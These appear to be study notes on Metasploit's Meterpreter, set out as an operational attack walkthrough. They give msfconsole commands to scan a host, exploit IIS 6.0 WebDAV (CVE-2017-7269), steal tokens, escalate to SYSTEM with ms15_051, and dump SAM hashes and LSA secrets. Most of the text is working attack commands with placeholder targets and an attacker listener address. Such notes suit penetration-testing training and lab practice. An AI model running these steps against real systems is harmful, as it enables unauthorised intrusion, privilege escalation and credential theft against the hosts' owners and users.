### **Meterpreter Overview**

**Meterpreter** is an extensible, multi-faceted payload that operates via **DLL injection** to provide a stable, encrypted, and stealthy connection to a victim host.

|Feature|Impact on Operations|
|:--|:--|
|**In-Memory Execution**|Resides entirely in RAM; leaves no traces on the hard drive and creates no new processes.|
|**Encryption**|Uses **AES** for all communications, ensuring data confidentiality and integrity.|
|**Extensibility**|Features can be augmented at runtime or loaded over the network without rebuilding the payload.|
|**Channelization**|Uses a channelized communication system to spawn multiple shells or streams (e.g., host-OS shells) over a single connection.|

---

### **Phase 1: Enumeration and Initial Access**

#### **1. Service Scanning**

Use `db_nmap` within `msfconsole` to track target data and identify vulnerable services.

```
msf6 > db_nmap -sV -p- -T5 -A <TARGET_IP>
```

- **Goal:** Identify service versions and potential vulnerabilities (e.g., **Microsoft IIS 6.0**).
- **Verification:** Use the `hosts` and `services` commands to view the backend database results.

#### **2. Exploiting IIS 6.0 WebDAV**

**Scenario:** Use when a target is running **IIS 6.0** with **WebDAV** enabled (vulnerability **CVE-2017-7269**).

**Operational Steps:**

1. Search for and select the exploit module.
2. Configure target and listener parameters.
3. Execute the exploit to drop the Meterpreter stage.

```
msf6 > search iis_webdav_upload_asp
msf6 > use 0
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOSTS <TARGET_IP>
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set LHOST <ATTACK_IP>
msf6 exploit(windows/iis/iis_webdav_upload_asp) > run
```

|Parameter|Description|
|:--|:--|
|`RHOSTS`|The target address.|
|`LHOST`|Your attack machine interface (e.g., `tun0`).|
|`PATH`|The remote path for the uploaded `.asp` payload.|

**Attack Implications:**

- **Forensic Footprint:** This exploit attempts to upload a temporary `.asp` file. If the system has strict permissions, **deletion may fail**, leaving a file on disk that can be detected by sysadmins or security software.

---

### **Phase 2: Post-Exploitation and Privilege Escalation**

#### **1. Token Stealing and Process Migration**

**Scenario:** Use when the initial shell has limited permissions (e.g., `Access is denied` on `getuid`) and you need to assume the identity of a service account to perform further enumeration.

**Operational Steps:**

1. List running processes to find a target service account (e.g., `NETWORK SERVICE`).
2. Steal the token of the target process ID (PID).

```
meterpreter > getuid
meterpreter > ps
meterpreter > steal_token <PID>
```

#### **2. Local Exploit Suggestion**

**Scenario:** Use when you have a low-privileged session and need to identify kernel-level or service vulnerabilities for **Privilege Escalation**.

**Operational Steps:**

1. **Background** the current session.
2. Search for and run the `local_exploit_suggester`.
3. Note the successful "The target appears to be vulnerable" results.

```
meterpreter > bg
msf6 > search local_exploit_suggester
msf6 > use 0
msf6 post(multi/recon/local_exploit_suggester) > set SESSION <SESSION_ID>
msf6 post(multi/recon/local_exploit_suggester) > run
```

#### **3. Executing the Escalation Exploit**

Select an exploit identified by the suggester (e.g., `ms15_051_client_copy_image`) to gain **SYSTEM** level access.

```
msf6 > use exploit/windows/local/ms15_051_client_copy_image
msf6 exploit(windows/local/ms15_051_client_copy_image) > set SESSION <SESSION_ID>
msf6 exploit(windows/local/ms15_051_client_copy_image) > set LHOST <ATTACK_IP>
msf6 exploit(windows/local/ms15_051_client_copy_image) > run
meterpreter > getuid
```

- **Result:** Successful execution provides a **root/SYSTEM shell**, granting total control over the target.

---

### **Phase 3: Data Collection and Looting**

Once **SYSTEM** access is achieved, extract credentials to facilitate lateral movement or persistence.

|Command|Action|
|:--|:--|
|`hashdump`|Dumps the contents of the **SAM** database (local user hashes).|
|`lsa_dump_sam`|Dumps SAM domain information, including SIDs and NTLM hashes.|
|`lsa_dump_secrets`|Extracts **LSA secrets**, such as service account passwords (e.g., `aspnet_WP_PASSWORD`) and cached credentials.|

**Attack Implications:** Extracted "loot" can be used to **impersonate users** or **pivot** to other systems if the network security posture is weak.